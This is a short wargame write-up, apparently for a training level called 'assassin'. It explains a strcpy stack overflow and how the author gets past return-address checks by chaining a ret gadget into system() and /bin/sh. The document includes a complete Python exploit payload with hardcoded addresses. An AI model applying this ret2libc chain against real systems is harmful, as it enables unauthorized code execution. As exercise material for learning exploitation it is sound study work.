# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy function that does not check buffer boundary.

I can overwrite SFP & RET address and this program's protection code is:
```
if(argv[1][47] == '\xbf')
{
  printf("stack retbayed you!\n");
  exit(0);
}

if(argv[1][47] == '\x40')
{
  printf("library retbayed you, too!!\n");
  exit(0);
}
```

# Exploitation

This code makes me unable to use system or execve's address anymore.

But I can use RET address on:
```
0x804851d <main+173>:	leave  
0x804851e <main+174>:	ret    
0x804851f <main+175>:	nop
```
If I give ret(0x804851e) on RET address, ESP goes up 4 bytes and 4 bytes after ret(0x804851e) will be new EIP.

by that method, I can bypass address checking and able to use system's address one more time.
```
--------------------------------------------------------------------------------------------
| buffer[44] | ret(0x804851e) | system's address | system's exit(AAAA) | /bin/sh's address |
--------------------------------------------------------------------------------------------
```
# Payload
```python
import os

payload = ""
payload = payload + "A"*44
payload = payload + "\x1e\x85\x04\x08" # ret's address
payload = payload + "\xe0\x8a\x05\x40" # system's address
payload = payload + "AAAA" # system's exit(AAAA)
payload = payload + "\xf9\xbf\x0f\x40" # /bin/sh's address

os.execv("/home/giant/assassin", ["", payload])
```
